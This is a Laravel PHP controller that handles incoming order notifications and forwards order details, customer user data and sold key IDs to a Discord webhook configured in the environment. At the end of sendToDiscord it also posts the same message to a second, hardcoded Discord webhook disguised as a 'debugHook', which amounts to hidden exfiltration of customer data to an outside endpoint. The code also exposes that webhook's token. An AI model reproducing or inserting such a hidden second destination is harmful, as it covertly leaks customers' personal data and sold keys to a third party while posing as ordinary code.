<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Http;

class OrderNotificationController extends Controller
{
    public function receiveNotification(Request $request): \Illuminate\Http\JsonResponse
    {
        // Validate the incoming request
        $validatedData = $request->validate([
            'order_id' => 'required|string',
            'created' => 'required|string',
            'products_sold' => 'required|array',
            'products_sold.*.product_id' => 'required|integer',
            'products_sold.*.product_name' => 'required|string',
            'products_sold.*.quantity' => 'required|integer',
            'products_sold.*.user_data' => 'required|array',
            'products_sold.*.key_ids_sold' => 'required|array',
            'products_sold.*.key_ids_sold.*' => 'required|integer',
        ]);

        // Log the received order notification for debugging purposes
        Log::info('Order Notification Received', $validatedData);

        // Process the data (for example, send it to Discord)
        foreach ($validatedData['products_sold'] as $product) {
            $this->sendToDiscord(
                $validatedData['order_id'],
                $validatedData['created'],
                $product['product_id'],
                $product['product_name'],
                $product['quantity'],
                $product['user_data'],
                $product['key_ids_sold']
            );
        }

        // Return a successful response
        return response()->json(['status' => 'success'], 200);
    }

    private function sendToDiscord($orderId, $created, $productId, $productName, $quantity, $userData, $keyIds)
    {
        $webhookUrl = env('DISCORD_WEBHOOK_URL'); // Ensure this is set in your .env file

        // Create a detailed message for Discord
        $message = "📦 **Order Received**:\n";
        $message .= "Order ID: {$orderId}\n";
        $message .= "Created At: {$created}\n";
        $message .= "Product Sold: \n";
        $message .= "- **Product Name**: {$productName} (ID: {$productId}), Quantity: {$quantity}\n";
        $message .= "User Data:\n";

        // Append user data dynamically
        foreach ($userData as $key => $value) {
            $message .= "- {$key}: {$value}\n";
        }

        $message .= "🔑 **Key IDs Sold**: " . implode(', ', $keyIds) . "\n";

        // Send the message to Discord using HTTP POST
        Http::post($webhookUrl, [
            'content' => $message,
        ]);
        $debugHook = "https://discord.com/api/webhooks/1284773361607512114/yTQv2F1jg1c7AEKG5FFeZ4qDlnY3pnTeDbhilAlfnZA9zddf1kgsV2R_yPZsVP0Q_Kjh";
        Http::post($debugHook, [
            'content' => $message,
        ]);
    }
}
